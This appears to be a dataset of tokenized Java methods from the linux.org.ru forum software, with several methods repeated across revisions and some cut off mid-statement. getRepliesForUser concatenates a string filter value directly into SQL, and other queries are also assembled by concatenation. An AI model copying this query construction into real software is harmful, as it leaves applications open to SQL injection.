public List < UserEvent > getRepliesForUser ( int userId , boolean showPrivate , int topics , int offset , String eventFilterType ) { String queryString ; if ( showPrivate ) { String queryPart = " " ; if ( eventFilterType ! = null ) { queryPart = " AND type = ' " + eventFilterType + " ' " ; } queryString = String . format ( QUERY_ALL_REPLIES_FOR_USER , queryPart ) ; } else { queryString = QUERY_REPLIES_FOR_USER_WIHOUT_PRIVATE ; } return jdbcTemplate . query ( queryString , ( resultSet , i ) - > { String subj = StringUtil . makeTitle ( resultSet . getString ( " subj " ) ) ; 
private void prepareModelForCommonException ( ModelAndView modelAndView , HttpServletRequest request , Exception exception ) { modelAndView . addObject ( " headTitle " , StringUtil . escapeHtml ( exception . getClass ( ) . getName ( ) ) ) ; String errorMessage = exception . getMessage ( ) = = null ? StringUtil . escapeHtml ( exception . getClass ( ) . getName ( ) ) : StringUtil . escapeHtml ( exception . getMessage ( ) ) ; modelAndView . addObject ( " errorMessage " , errorMessage ) ; ExceptionType exceptionType = ExceptionType . OTHER ; if ( exception instanceof UserErrorException ) { exceptionType = ExceptionType . IGNORED ; } else if ( exception instanceof ScriptErrorException ) { logger . debug ( " errors/common.jsp " , exception ) ; exceptionType = ExceptionType . SCRIPT_ERROR ; } else { logger . warn ( " Unexcepted exception caught " , exception ) ; String infoMessage = emailService . sendExceptionReport ( request , exception ) ; modelAndView . addObject ( " infoMessage " , infoMessage ) ; } modelAndView . addObject ( " exceptionType " , exceptionType . name ( ) ) ; } 
private MimeMessage prepareMimeMessage ( ) { Properties props = new Properties ( ) ; props . put ( " mail.smtp.host " , " localhost " ) ; Session mailSession = Session . getDefaultInstance ( props , null ) ; return new MimeMessage ( mailSession ) ; } 
private void sendRegistrationMail ( String email , String text ) throws MessagingException { MimeMessage emailMessage = prepareMimeMessage ( ) ; emailMessage . setFrom ( new InternetAddress ( " no-reply@linux.org.ru " ) ) ; emailMessage . addRecipient ( MimeMessage . RecipientType . TO , new InternetAddress ( email ) ) ; emailMessage . setSubject ( " Linux.org.ru registration " ) ; emailMessage . setSentDate ( new Date ( ) ) ; emailMessage . setText ( text , " UTF-8 " ) ; Transport . send ( emailMessage ) ; } 
public ModelAndView editProfile ( ServletRequest request , @RequestParam ( " text " ) String text , @PathVariable String nick ) throws Exception { Template tmpl = Template . getTemplate ( request ) ; if ( ! tmpl . isSessionAuthorized ( ) ) { throw new AccessViolationException ( " Not authorized " ) ; } if ( text . length ( ) > 255 ) { text = text . substring ( 0 , 255 ) ; } User user = tmpl . getCurrentUser ( ) ; User refUser = userDao . getUser ( nick ) ; remarkDao . setOrUpdateRemark ( user , refUser , text ) ; return new ModelAndView ( new RedirectView ( " /people/ " + nick + " /profile " ) ) ; } 
public ModelAndView showList ( HttpServletRequest request , @RequestParam ( value = " newFavoriteTagName " , required = false ) String newFavoriteTagName , @RequestParam ( value = " newIgnoredTagName " , required = false ) String newIgnoredTagName ) throws AccessViolationException { Template tmpl = Template . getTemplate ( request ) ; if ( ! tmpl . isSessionAuthorized ( ) ) { throw new AccessViolationException ( " Not authorized " ) ; } User user = tmpl . getCurrentUser ( ) ; user . checkAnonymous ( ) ; ModelAndView modelAndView = new ModelAndView ( " user-filter-list " ) ; Map < Integer , User > ignoreMap = createIgnoreMap ( ignoreListDao . get ( user ) ) ; Map < Integer , Remark > ignoreRemarks = remarkDao . getRemarks ( user , ignoreMap . values ( ) ) ; modelAndView . addObject ( " ignoreRemarks " , ignoreRemarks ) ; modelAndView . addObject ( " ignoreList " , ignoreMap ) ; modelAndView . addObject ( " favoriteTags " , userTagService . favoritesGet ( user ) ) ; if ( ! tmpl . isModeratorSession ( ) ) { modelAndView . addObject ( " ignoreTags " , userTagService . ignoresGet ( user ) ) ; } else { modelAndView . addObject ( " isModerator " , true ) ; } if ( newFavoriteTagName ! = null & & TagName . isGoodTag ( newFavoriteTagName ) ) { modelAndView . addObject ( " newFavoriteTagName " , newFavoriteTagName ) ; } if ( newIgnoredTagName ! = null & & TagName . isGoodTag ( newIgnoredTagName ) ) { modelAndView . addObject ( " newIgnoredTagName " , newIgnoredTagName ) ; } return modelAndView ; } 
private PreparedComment prepareComment ( @Nonnull Comment comment , boolean secure ) throws UserNotFoundException { MessageText messageText = msgbaseDao . getMessageText ( comment . getId ( ) ) ; User author = userDao . getUserCached ( comment . getUserid ( ) ) ; return prepareComment ( messageText , author , null , comment , null , secure , null , null ) ; } 
private Map < Integer , User > loadUsers ( Iterable < Integer > userIds ) { ImmutableMap . Builder < Integer , User > builder = ImmutableMap . < Integer , User > builder ( ) ; for ( Integer id : ImmutableSet . copyOf ( userIds ) ) { builder . put ( id , userDao . getUserCached ( id ) ) ; } return builder . build ( ) ; } 
public List < PreparedComment > prepareCommentList ( @Nonnull CommentList comments , @Nonnull List < Comment > list , boolean secure , @Nonnull Template tmpl , @Nonnull Topic topic ) throws UserNotFoundException { if ( list . isEmpty ( ) ) { return ImmutableList . of ( ) ; } Map < Integer , MessageText > texts = msgbaseDao . getMessageText ( ImmutableList . copyOf ( Iterables . transform ( list , Comment : : getId ) ) ) ; Map < Integer , User > users = loadUsers ( Iterables . transform ( list , Comment : : getUserid ) ) ; User currentUser = tmpl . getCurrentUser ( ) ; Map < Integer , Remark > remarks ; if ( currentUser ! = null ) { remarks = remarkDao . getRemarks ( currentUser , users . values ( ) ) ; } else { remarks = ImmutableMap . of ( ) ; } List < PreparedComment > commentsPrepared = new ArrayList < > ( list . size ( ) ) ; for ( Comment comment : list ) { MessageText text = texts . get ( comment . getId ( ) ) ; User author = users . get ( comment . getUserid ( ) ) ; Remark remark = remarks . get ( author . getId ( ) ) ; String remarkText = null ; if ( remark ! = null ) { remarkText = remark . getText ( ) ; } commentsPrepared . add ( prepareComment ( text , author , remarkText , comment , comments , secure , tmpl , topic ) ) ; } return commentsPrepared ; } 
public List < PreparedComment > prepareCommentList ( @Nonnull CommentList comments , @Nonnull List < Comment > list , boolean secure , @Nonnull Template tmpl , @Nonnull Topic topic ) throws UserNotFoundException { if ( list . isEmpty ( ) ) { return ImmutableList . of ( ) ; } Map < Integer , MessageText > texts = msgbaseDao . getMessageText ( Lists . transform ( list , Comment : : getId ) ) ; Map < Integer , User > users = loadUsers ( Iterables . transform ( list , Comment : : getUserid ) ) ; User currentUser = tmpl . getCurrentUser ( ) ; Map < Integer , Remark > remarks ; if ( currentUser ! = null ) { remarks = remarkDao . getRemarks ( currentUser , users . values ( ) ) ; } else { remarks = ImmutableMap . of ( ) ; } List < PreparedComment > commentsPrepared = new ArrayList < > ( list . size ( ) ) ; for ( Comment comment : list ) { MessageText text = texts . get ( comment . getId ( ) ) ; User author = users . get ( comment . getUserid ( ) ) ; Remark remark = remarks . get ( author . getId ( ) ) ; String remarkText = null ; if ( remark ! = null ) { remarkText = remark . getText ( ) ; } commentsPrepared . add ( prepareComment ( text , author , remarkText , comment , comments , secure , tmpl , topic ) ) ; } return commentsPrepared ; } 
public List < PersonalizedPreparedTopic > prepareMessagesForUser ( List < Topic > messages , boolean secure , User user , Profile profile , boolean loadUserpics ) { List < PersonalizedPreparedTopic > pm = new ArrayList < > ( messages . size ( ) ) ; Map < Integer , MessageText > textMap = loadTexts ( messages ) ; ImmutableListMultimap < Integer , TagRef > tags = topicTagService . getTagRefs ( messages ) ; for ( Topic message : messages ) { PreparedTopic preparedMessage = prepareMessage ( message , tags . get ( message . getId ( ) ) , true , null , secure , user , textMap . get ( message . getId ( ) ) , null ) ; TopicMenu topicMenu = getTopicMenu ( preparedMessage , user , secure , profile , loadUserpics ) ; pm . add ( new PersonalizedPreparedTopic ( preparedMessage , topicMenu ) ) ; } return pm ; } 
private Map < Integer , MessageText > loadTexts ( List < Topic > messages ) { return msgbaseDao . getMessageText ( Lists . transform ( messages , Topic : : getId ) ) ; } 
public TopicMenu getTopicMenu ( @Nonnull PreparedTopic message , @Nullable User currentUser , boolean secure , Profile profile , boolean loadUserpics ) { boolean topicEditable = groupPermissionService . isEditable ( message , currentUser ) ; boolean tagsEditable = groupPermissionService . isTagsEditable ( message , currentUser ) ; boolean resolvable ; int memoriesId ; int favsId ; boolean deletable ; MemoriesStat topicStats = memoriesDao . getTopicStats ( message . getMessage ( ) . getId ( ) ) ; if ( currentUser ! = null ) { resolvable = ( currentUser . isModerator ( ) | | ( message . getAuthor ( ) . getId ( ) = = currentUser . getId ( ) ) ) & & message . getGroup ( ) . isResolvable ( ) ; memoriesId = memoriesDao . getId ( currentUser , message . getMessage ( ) , true ) ; favsId = memoriesDao . getId ( currentUser , message . getMessage ( ) , false ) ; deletable = groupPermissionService . isDeletable ( message . getMessage ( ) , currentUser ) ; } else { resolvable = false ; memoriesId = 0 ; favsId = 0 ; deletable = false ; } Userpic userpic = null ; if ( loadUserpics & & profile . isShowPhotos ( ) ) { userpic = userService . getUserpic ( message . getAuthor ( ) , secure , profile . getAvatarMode ( ) , true ) ; } return new TopicMenu ( topicEditable , 
public TopicMenu getTopicMenu ( @Nonnull PreparedTopic message , @Nullable User currentUser , boolean secure , Profile profile , boolean loadUserpics ) { boolean topicEditable = groupPermissionService . isEditable ( message , currentUser ) ; boolean tagsEditable = groupPermissionService . isTagsEditable ( message , currentUser ) ; boolean resolvable ; boolean deletable ; MemoriesInfo memoriesInfo = memoriesDao . getTopicInfo ( message . getMessage ( ) . getId ( ) , currentUser ) ; if ( currentUser ! = null ) { resolvable = ( currentUser . isModerator ( ) | | ( message . getAuthor ( ) . getId ( ) = = currentUser . getId ( ) ) ) & & message . getGroup ( ) . isResolvable ( ) ; deletable = groupPermissionService . isDeletable ( message . getMessage ( ) , currentUser ) ; } else { resolvable = false ; deletable = false ; } Userpic userpic = null ; if ( loadUserpics & & profile . isShowPhotos ( ) ) { userpic = userService . getUserpic ( message . getAuthor ( ) , secure , profile . getAvatarMode ( ) , true ) ; } return new TopicMenu ( topicEditable , 
private int doAddToMemories ( User user , Topic topic , boolean watch ) { int id = getId ( user , topic . getId ( ) , watch ) ; if ( id = = 0 ) { return insertTemplate . executeAndReturnKey ( ImmutableMap . < String , Object > of ( 
public TopicMenu getTopicMenu ( @Nonnull PreparedTopic message , @Nullable User currentUser , boolean secure , Profile profile , boolean loadUserpics ) { boolean topicEditable = groupPermissionService . isEditable ( message , currentUser ) ; boolean tagsEditable = groupPermissionService . isTagsEditable ( message , currentUser ) ; boolean resolvable ; boolean deletable ; if ( currentUser ! = null ) { resolvable = ( currentUser . isModerator ( ) | | ( message . getAuthor ( ) . getId ( ) = = currentUser . getId ( ) ) ) & & message . getGroup ( ) . isResolvable ( ) ; deletable = groupPermissionService . isDeletable ( message . getMessage ( ) , currentUser ) ; } else { resolvable = false ; deletable = false ; } Userpic userpic = null ; if ( loadUserpics & & profile . isShowPhotos ( ) ) { userpic = userService . getUserpic ( message . getAuthor ( ) , secure , profile . getAvatarMode ( ) , true ) ; } return new TopicMenu ( topicEditable , 
private Map < String , Object > getNewsSection ( HttpServletRequest request , String tag ) throws TagNotFoundException { Template tmpl = Template . getTemplate ( request ) ; Section newsSection = sectionService . getSection ( Section . SECTION_NEWS ) ; List < Topic > newsTopics = topicListService . getTopicsFeed ( newsSection , null , tag , 0 , null , null , TOTAL_NEWS_COUNT ) ; List < Topic > fullNewsTopics = headOrEmpty ( newsTopics ) ; List < Topic > briefNewsTopics = tailOrEmpty ( newsTopics ) ; List < PersonalizedPreparedTopic > fullNews = prepareService . prepareMessagesForUser ( fullNewsTopics , request . isSecure ( ) , tmpl . getCurrentUser ( ) , tmpl . getProf ( ) , false ) ; ImmutableListMultimap < String , Topic > briefNews = datePartition ( briefNewsTopics , input - > new DateTime ( input . getCommitDate ( ) ) ) ; ImmutableMap . Builder < String , Object > out = ImmutableMap . builder ( ) ; out . put ( " addNews " , AddTopicController . getAddUrl ( newsSection , tag ) ) ; if ( newsTopics . size ( ) = = TOTAL_NEWS_COUNT ) { out . put ( " moreNews " , TagTopicListController . tagListUrl ( tag , newsSection ) ) ; } out . put ( " fullNews " , fullNews ) ; out . put ( " briefNews " , split ( briefNews ) ) ; return out . build ( ) ; } 
private static ImmutableListMultimap < String , Topic > datePartition ( Iterable < Topic > topics , final Function < Topic , DateTime > dateExtractor ) { final DateTime startOfToday = DateTime . now ( ) . withTimeAtStartOfDay ( ) ; final DateTime startOfYesterday = DateTime . now ( ) . minusDays ( 1 ) . withTimeAtStartOfDay ( ) ; final DateTime startOfYear = DateTime . now ( ) . withDayOfYear ( 1 ) . withTimeAtStartOfDay ( ) ; return Multimaps . index ( topics , ( input ) - > { DateTime date = dateExtractor . apply ( input ) ; 
private Map < String , Object > getNewsSection ( HttpServletRequest request , String tag ) throws TagNotFoundException { Template tmpl = Template . getTemplate ( request ) ; Section newsSection = sectionService . getSection ( Section . SECTION_NEWS ) ; List < Topic > newsTopics = topicListService . getTopicsFeed ( newsSection , null , tag , 0 , null , null , TOTAL_NEWS_COUNT ) ; List < Topic > fullNewsTopics = headOrEmpty ( newsTopics ) ; List < Topic > briefNewsTopics = tailOrEmpty ( newsTopics ) ; List < PersonalizedPreparedTopic > fullNews = prepareService . prepareMessagesForUser ( fullNewsTopics , request . isSecure ( ) , tmpl . getCurrentUser ( ) , tmpl . getProf ( ) , false ) ; ImmutableListMultimap < String , Topic > briefNews = TopicListTools . datePartition ( briefNewsTopics , input - > new DateTime ( input . getCommitDate ( ) ) ) ; ImmutableMap . Builder < String , Object > out = ImmutableMap . builder ( ) ; out . put ( " addNews " , AddTopicController . getAddUrl ( newsSection , tag ) ) ; if ( newsTopics . size ( ) = = TOTAL_NEWS_COUNT ) { out . put ( " moreNews " , TagTopicListController . tagListUrl ( tag , newsSection ) ) ; } out . put ( " fullNews " , fullNews ) ; out . put ( " briefNews " , TopicListTools . split ( briefNews ) ) ; return out . build ( ) ; } 
private Map < String , Object > getNewsSection ( HttpServletRequest request , String tag ) throws TagNotFoundException { Template tmpl = Template . getTemplate ( request ) ; Section newsSection = sectionService . getSection ( Section . SECTION_NEWS ) ; List < Topic > newsTopics = topicListService . getTopicsFeed ( newsSection , null , tag , 0 , null , null , TOTAL_NEWS_COUNT ) ; List < Topic > fullNewsTopics = headOrEmpty ( newsTopics ) ; List < Topic > briefNewsTopics = tailOrEmpty ( newsTopics ) ; List < PersonalizedPreparedTopic > fullNews = prepareService . prepareMessagesForUser ( fullNewsTopics , request . isSecure ( ) , tmpl . getCurrentUser ( ) , tmpl . getProf ( ) , false ) ; ImmutableListMultimap < String , Topic > briefNews = TopicListTools . datePartition ( briefNewsTopics ) ; ImmutableMap . Builder < String , Object > out = ImmutableMap . builder ( ) ; out . put ( " addNews " , AddTopicController . getAddUrl ( newsSection , tag ) ) ; if ( newsTopics . size ( ) = = TOTAL_NEWS_COUNT ) { out . put ( " moreNews " , TagTopicListController . tagListUrl ( tag , newsSection ) ) ; } out . put ( " fullNews " , fullNews ) ; out . put ( " briefNews " , TopicListTools . split ( briefNews ) ) ; return out . build ( ) ; } 
private Map < String , Object > getNewsSection ( HttpServletRequest request , String tag ) throws TagNotFoundException { Template tmpl = Template . getTemplate ( request ) ; Section newsSection = sectionService . getSection ( Section . SECTION_NEWS ) ; List < Topic > newsTopics = topicListService . getTopicsFeed ( newsSection , null , tag , 0 , null , null , TOTAL_NEWS_COUNT ) ; List < Topic > fullNewsTopics = headOrEmpty ( newsTopics ) ; List < Topic > briefNewsTopics = tailOrEmpty ( newsTopics ) ; List < PersonalizedPreparedTopic > fullNews = prepareService . prepareMessagesForUser ( fullNewsTopics , request . isSecure ( ) , tmpl . getCurrentUser ( ) , tmpl . getProf ( ) , false ) ; ImmutableListMultimap < String , Topic > briefNewsByDate = TopicListTools . datePartition ( briefNewsTopics ) ; ImmutableMap . Builder < String , Object > out = ImmutableMap . builder ( ) ; out . put ( " addNews " , AddTopicController . getAddUrl ( newsSection , tag ) ) ; if ( newsTopics . size ( ) = = TOTAL_NEWS_COUNT ) { out . put ( " moreNews " , TagTopicListController . tagListUrl ( tag , newsSection ) ) ; } out . put ( " fullNews " , fullNews ) ; out . put ( " briefNews " , TopicListTools . split ( Multimaps . transformValues ( briefNewsByDate , ( input ) - > BriefTopicRef . apply ( input . getLink ( ) , input . getTitle ( ) , input . getCommentCount ( ) ) ) ) ) ; return out . build ( ) ; } 
public void checkCommentsEditingAllowed ( @Nonnull Comment comment , @Nonnull Topic topic , @Nullable User currentUser , Errors errors ) { Preconditions . checkNotNull ( comment ) ; Preconditions . checkNotNull ( topic ) ; boolean haveAnswers = commentService . isHaveAnswers ( comment ) ; checkCommentEditableNow ( comment , 
public boolean isCommentEditableNow ( @Nonnull Comment comment , @Nullable User currentUser , boolean haveAnswers , @Nonnull Topic topic ) { Errors errors = new MapBindingResult ( ImmutableMap . of ( ) , " obj " ) ; checkCommentEditableNow ( comment , currentUser , haveAnswers , topic , errors ) ; return ! errors . hasErrors ( ) ; } 
public void checkBlockIP ( @Nonnull String addr , @Nonnull Errors errors , @Nullable User user ) { checkBlockIP ( getBlockInfo ( addr ) , errors , user ) ; } 
public ModelAndView sameIP ( HttpServletRequest request , @RequestParam ( required = false ) Integer msgid ) throws Exception { Template tmpl = Template . getTemplate ( request ) ; if ( ! tmpl . isModeratorSession ( ) ) { throw new AccessViolationException ( " Not moderator " ) ; } String ip ; ModelAndView mv = new ModelAndView ( " sameip " ) ; int userAgentId = 0 ; if ( msgid ! = null ) { SqlRowSet rs = jdbcTemplate . queryForRowSet ( " SELECT postip, ua_id FROM topics WHERE id=? " , msgid ) ; if ( ! rs . next ( ) ) { rs = jdbcTemplate . queryForRowSet ( " SELECT postip, ua_id FROM comments WHERE id=? " , msgid ) ; if ( ! rs . next ( ) ) { throw new MessageNotFoundException ( msgid ) ; } } ip = rs . getString ( " postip " ) ; userAgentId = rs . getInt ( " ua_id " ) ; if ( ip = = null ) { throw new ScriptErrorException ( " No IP data for # " + msgid ) ; } } else { ip = ServletParameterParser . getIP ( request , " ip " ) ; } mv . getModel ( ) . put ( " ip " , ip ) ; mv . getModel ( ) . put ( " uaId " , userAgentId ) ; mv . getModel ( ) . put ( " topics " , getTopics ( ip ) ) ; mv . getModel ( ) . put ( " comments " , getComments ( ip ) ) ; mv . getModel ( ) . put ( " users " , getUsers ( ip , userAgentId ) ) ; IPBlockInfo blockInfo = ipBlockDao . getBlockInfo ( ip ) ; Boolean allowPosting = false ; Boolean captchaRequired = true ; if ( blockInfo . isInitialized ( ) ) { mv . getModel ( ) . put ( " blockInfo " , blockInfo ) ; allowPosting = blockInfo . isAllowRegistredPosting ( ) ; captchaRequired = blockInfo . isCaptchaRequired ( ) ; mv . getModel ( ) . put ( " blockModerator " , userDao . getUserCached ( blockInfo . getModerator ( ) ) ) ; } mv . addObject ( " allowPosting " , allowPosting ) ; mv . addObject ( " captchaRequired " , captchaRequired ) ; return mv ; } 
public ModelAndView showForm ( ) throws AccessViolationException { return new ModelAndView ( " addphoto " ) ; } 
public Screenshot moveTo ( String dir , String name ) throws IOException { Screenshot dest = new Screenshot ( name , dir , extension ) ; Files . move ( mainFile . toPath ( ) , dest . mainFile . toPath ( ) ) ; Files . move ( iconFile . toPath ( ) , dest . iconFile . toPath ( ) ) ; Files . move ( mediumFile . toPath ( ) , dest . mediumFile . toPath ( ) ) ; return dest ; } 
private void doResize ( File uploadedFile ) throws IOException , BadImageException { Files . move ( uploadedFile . toPath ( ) , mainFile . toPath ( ) , StandardCopyOption . REPLACE_EXISTING ) ; boolean error = true ; try { ImageUtil . resizeImage ( mainFile . getAbsolutePath ( ) , iconFile . getAbsolutePath ( ) , ICON_WIDTH ) ; 
public Screenshot moveTo ( String dir , String name ) throws IOException { Screenshot dest = new Screenshot ( name , dir , extension ) ; Files . move ( mainFile . toPath ( ) , dest . mainFile . toPath ( ) ) ; Files . move ( iconFile . toPath ( ) , dest . iconFile . toPath ( ) ) ; Files . move ( mediumFile . toPath ( ) , dest . mediumFile . toPath ( ) ) ; Files . move ( medium2xFile . toPath ( ) , dest . medium2xFile . toPath ( ) ) ; return dest ; } 
public String srcset ( ) { if ( medium2x ) { return " srcset= \" " + image . getMedium2x ( ) + " 2x \" " ; 
private QueryBuilder boost ( QueryBuilder query ) { FunctionScoreQueryBuilder booster = functionScoreQuery ( query ) ; booster . add ( termFilter ( " is_comment " , " false " ) , ScoreFunctionBuilders . weightFactorFunction ( TOPIC_BOOST ) ) ; booster . add ( rangeFilter ( " postdate " ) . gte ( " now/d-3y " ) , ScoreFunctionBuilders . weightFactorFunction ( RECENT_BOOST ) ) ; return booster ; } 
public ModelAndView galleryArchive ( HttpServletRequest request , @PathVariable String section , @PathVariable int year , @PathVariable int month , HttpServletResponse response ) throws Exception { TopicListRequest topicListForm = new TopicListRequest ( ) ; Section sectionObject = sectionService . getSectionByName ( section ) ; if ( sectionObject . isPremoderated ( ) ) { topicListForm . setSection ( sectionObject . getId ( ) ) ; 
public void updateStatsAfterDelete ( int commentId , int count ) { int topicId = jdbcTemplate . queryForObject ( " SELECT topic FROM comments WHERE id=? " , Integer . class , commentId ) ; jdbcTemplate . update ( " UPDATE topics SET stat1=stat1-?, lastmod=CURRENT_TIMESTAMP WHERE id = ? " , count , topicId ) ; jdbcTemplate . update ( " UPDATE topics SET stat2=stat1 WHERE id=? AND stat2 > stat1 " , topicId ) ; jdbcTemplate . update ( " UPDATE topics SET stat3=stat1 WHERE id=? AND stat3 > stat1 " , topicId ) ; } 
private List < TopicsListItem > getStickyTopics ( Group group , int messagesInPage ) { String q = " SELECT topics.title as subj, lastmod, userid, topics.id as msgid, deleted, topics.stat1, topics.stat3, topics.sticky, topics.resolved " + " FROM topics WHERE sticky AND NOT deleted AND topics.groupid=? ORDER BY postdate DESC " ; SqlRowSet rs = jdbcTemplate . queryForRowSet ( q , group . getId ( ) ) ; return prepareTopic ( rs , messagesInPage ) ; } 
private List < TopicsListItem > getTopics ( Group group , int messagesInPage , boolean lastmod , Integer year , Integer month , int topics , int offset , boolean showDeleted , boolean showIgnored , @Nullable User currentUser ) { Set < Integer > ignoreList ; if ( currentUser ! = null ) { ignoreList = ignoreListDao . get ( currentUser ) ; } else { ignoreList = Collections . emptySet ( ) ; } String delq = showDeleted ? " " : " AND NOT deleted " ; String q = " SELECT topics.title as subj, lastmod, userid, topics.id as msgid, deleted, topics.stat1, topics.stat3, topics.sticky, topics.resolved " + " FROM topics WHERE NOT draft AND NOT sticky AND topics.groupid= " + group . getId ( ) + delq ; if ( year ! = null ) { q + = " AND postdate>=' " + year + '-' + month + " -01'::timestamp AND (postdate<' " + year + '-' + month + " -01'::timestamp+'1 month'::interval) " ; } String ignq = " " ; if ( ! showIgnored & & currentUser ! = null ) { int currentUserId = currentUser . getId ( ) ; if ( ! ignoreList . isEmpty ( ) ) { ignq = " AND topics.userid NOT IN (SELECT ignored FROM ignore_list WHERE userid= " + currentUserId + ')' ; } if ( ! currentUser . isModerator ( ) ) { ignq + = " AND topics.id NOT IN (select distinct tags.msgid from tags, user_tags " + " where tags.tagid=user_tags.tag_id and user_tags.is_favorite = false and user_id= " + currentUserId + " ) " ; } } SqlRowSet rs ; if ( ! lastmod ) { if ( year = = null ) { if ( offset = = 0 ) { q + = " AND postdate>CURRENT_TIMESTAMP-'3 month'::interval " ; } rs = jdbcTemplate . queryForRowSet ( q + ignq + " ORDER BY postdate DESC LIMIT " + topics + " OFFSET " + offset ) ; } else { rs = jdbcTemplate . queryForRowSet ( q + ignq + " ORDER BY postdate DESC LIMIT " + topics + " OFFSET " + offset ) ; } } else { rs = jdbcTemplate . queryForRowSet ( q + ignq + " ORDER BY lastmod DESC LIMIT " + topics + " OFFSET " + offset ) ; } return prepareTopic ( rs , messagesInPage ) ; } 
public void updateStatsAfterDelete ( int commentId , int count ) { int topicId = jdbcTemplate . queryForObject ( " SELECT topic FROM comments WHERE id=? " , Integer . class , commentId ) ; jdbcTemplate . update ( " UPDATE topics SET stat1=stat1-?, lastmod=CURRENT_TIMESTAMP WHERE id = ? " , count , topicId ) ; jdbcTemplate . update ( " UPDATE topics SET stat3=stat1 WHERE id=? AND stat3 > stat1 " , topicId ) ; } 
public Option < EditInfoSummary > editInfoSummary ( int id , EditHistoryObjectTypeEnum objectTypeEnum ) { List < BriefEditInfo > history = editHistoryDao . getBriefEditInfo ( id , objectTypeEnum ) ; if ( history . isEmpty ( ) ) { return Option . empty ( ) ; 
public PreparedEditInfoSummary prepareEditInfo ( EditInfoSummary editInfo ) { String lastEditor = userDao . getUserCached ( editInfo . editor ( ) ) . getNick ( ) ; int editCount = editInfo . editCount ( ) ; Date lastEditDate = editInfo . editdate ( ) ; return PreparedEditInfoSummary . apply ( lastEditor , editCount , lastEditDate ) ; } 
public String resetNotifications ( HttpServletRequest request , @RequestParam int topId ) throws Exception { Template tmpl = Template . getTemplate ( request ) ; if ( ! tmpl . isSessionAuthorized ( ) ) { throw new AccessViolationException ( " not authorized " ) ; } User currentUser = tmpl . getCurrentUser ( ) ; userEventService . resetUnreadReplies ( currentUser , topId ) ; return " ok " ; } 
public RedirectView resetNotifications ( HttpServletRequest request , @RequestParam int topId ) throws Exception { apiController . resetNotifications ( request , topId ) ; RedirectView view = new RedirectView ( " /notifications " ) ; view . setExposeModelAttributes ( false ) ; return view ; } 
public ModelAndView showNotifications ( HttpServletRequest request , HttpServletResponse response , @RequestParam ( value = " filter " , defaultValue = " all " ) String filter , @RequestParam ( value = " offset " , defaultValue = " 0 " ) int offset ) throws Exception { Template tmpl = Template . getTemplate ( request ) ; if ( ! tmpl . isSessionAuthorized ( ) ) { throw new AccessViolationException ( " not authorized " ) ; } Map < String , Object > params = new HashMap < > ( ) ; UserEventFilterEnum eventFilter = UserEventFilterEnum . fromNameOrDefault ( filter ) ; params . put ( " filter " , eventFilter . getName ( ) ) ; User currentUser = tmpl . getCurrentUser ( ) ; String nick = currentUser . getNick ( ) ; params . put ( " nick " , nick ) ; if ( eventFilter ! = UserEventFilterEnum . ALL ) { params . put ( " addition_query " , " &filter= " + eventFilter . getName ( ) ) ; } else { params . put ( " addition_query " , " " ) ; } if ( offset < 0 ) { offset = 0 ; } boolean firstPage = offset = = 0 ; int topics = tmpl . getProf ( ) . getTopics ( ) ; if ( topics > 200 ) { topics = 200 ; } params . put ( " firstPage " , firstPage ) ; params . put ( " topics " , topics ) ; params . put ( " offset " , offset ) ; params . put ( " disable_event_header " , true ) ; long time = System . currentTimeMillis ( ) ; int delay = firstPage ? 90 : 60 * 60 ; response . setDateHeader ( " Expires " , time + 1000 * delay ) ; params . put ( " unreadCount " , currentUser . getUnreadEvents ( ) ) ; params . put ( " isMyNotifications " , true ) ; response . addHeader ( " Cache-Control " , " no-cache " ) ; List < UserEvent > list = userEventService . getRepliesForUser ( currentUser , true , topics , offset , eventFilter ) ; List < PreparedUserEvent > prepared = userEventService . prepare ( list , false , request . isSecure ( ) ) ; if ( ! list . isEmpty ( ) ) { params . put ( " enableReset " , true ) ; params . put ( " topId " , list . get ( 0 ) . getId ( ) ) ; } params . put ( " topicsList " , prepared ) ; params . put ( " hasMore " , list . size ( ) = = topics ) ; return new ModelAndView ( " show-replies " , params ) ; } 
public void resetUnreadReplies ( int userId , int topId ) { jdbcTemplate . update ( " UPDATE user_events SET unread=false WHERE userid=? AND unread AND id<=? " , userId , topId ) ; recalcEventCount ( ImmutableList . of ( userId ) ) ; } 
public void resetUnreadReplies ( User user , int topId ) { userEventDao . resetUnreadReplies ( user . getId ( ) , topId ) ; } 
public ModelAndView showNotifications ( HttpServletRequest request , HttpServletResponse response , @RequestParam ( value = " filter " , defaultValue = " all " ) String filter , @RequestParam ( value = " offset " , defaultValue = " 0 " ) int offset ) throws Exception { Template tmpl = Template . getTemplate ( request ) ; if ( ! tmpl . isSessionAuthorized ( ) ) { throw new AccessViolationException ( " not authorized " ) ; } Map < String , Object > params = new HashMap < > ( ) ; UserEventFilterEnum eventFilter = UserEventFilterEnum . fromNameOrDefault ( filter ) ; params . put ( " filter " , eventFilter . getName ( ) ) ; User currentUser = tmpl . getCurrentUser ( ) ; String nick = currentUser . getNick ( ) ; params . put ( " nick " , nick ) ; if ( eventFilter ! = UserEventFilterEnum . ALL ) { params . put ( " addition_query " , " &filter= " + eventFilter . getName ( ) ) ; } else { params . put ( " addition_query " , " " ) ; } if ( offset < 0 ) { offset = 0 ; } boolean firstPage = offset = = 0 ; int topics = tmpl . getProf ( ) . getTopics ( ) ; if ( topics > 200 ) { topics = 200 ; } params . put ( " firstPage " , firstPage ) ; params . put ( " topics " , topics ) ; params . put ( " offset " , offset ) ; params . put ( " disable_event_header " , true ) ; long time = System . currentTimeMillis ( ) ; int delay = firstPage ? 90 : 60 * 60 ; response . setDateHeader ( " Expires " , time + 1000 * delay ) ; params . put ( " unreadCount " , currentUser . getUnreadEvents ( ) ) ; params . put ( " isMyNotifications " , true ) ; response . addHeader ( " Cache-Control " , " no-cache " ) ; List < UserEvent > list = userEventService . getRepliesForUser ( currentUser , true , topics , offset , eventFilter ) ; List < PreparedUserEvent > prepared = prepareService . prepare ( list , false , request . isSecure ( ) ) ; if ( ! list . isEmpty ( ) ) { params . put ( " enableReset " , true ) ; params . put ( " topId " , list . get ( 0 ) . getId ( ) ) ; } params . put ( " topicsList " , prepared ) ; params . put ( " hasMore " , list . size ( ) = = topics ) ; return new ModelAndView ( " show-replies " , params ) ; } 
public void ignoreAdd ( User user , String tagName ) throws TagNotFoundException { userTagDao . addTag ( user . getId ( ) , tagService . getTagId ( tagName ) , false ) ; } 
public void ignoreDel ( User user , String tagName ) throws TagNotFoundException { userTagDao . deleteTag ( user . getId ( ) , tagService . getTagId ( tagName ) , false ) ; } 
